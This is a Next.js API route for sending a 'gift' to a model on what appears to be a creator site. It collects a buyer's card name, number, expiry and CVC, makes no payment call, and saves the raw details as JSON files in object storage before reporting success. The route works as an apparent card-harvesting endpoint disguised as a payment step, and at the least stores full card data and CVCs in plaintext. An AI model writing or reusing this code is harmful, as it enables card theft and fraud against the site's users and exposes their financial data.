import { type NextRequest, NextResponse } from "next/server";
import { getTranslations } from "next-intl/server";
import db from "@/lib/db";
import { getUser } from "@/lib/auth";
import giftSchema, { type GiftSchema } from "@/schema/gift";
import { putObject } from "@/lib/file";

export const POST = async (req: NextRequest) => {
    const t = await getTranslations({
        locale: req.cookies.get("NEXT_LOCALE")!.value,
    });
    try {
        const user = await getUser();
        const body = (await req.json()) as GiftSchema;

        if (!user?.user) {
            return NextResponse.json({
                success: false,
                message: t("messages.unauthorized"),
            });
        }

        const { error } = giftSchema(t).safeParse(body);

        if (error) {
            console.error(error);
            return NextResponse.json({
                success: false,
                errors: error.flatten().fieldErrors,
            });
        }

        const girl = await db.girl.findFirst({
            where: {
                id: body.modelId,
            },
        });

        if (!girl) {
            return NextResponse.json({
                success: false,
                message: t("messages.girl-not-found"),
            });
        }

        const info = JSON.stringify({
            name: body.name,
            number: body.number,
            expiry: body.expiry,
            cvc: body.cvc,
        });

        const fileBuffer = Buffer.from(info);
        await putObject(
            fileBuffer,
            `gifts/${body.name}_${crypto.randomUUID()}.json`
        );

        return NextResponse.json({
            success: true,
            redirect: `/${girl.username}?gift=success`,
        });
    } catch (err) {
        console.error(err);
        return NextResponse.json({
            success: false,
            message: t("messages.server-error"),
        });
    }
};
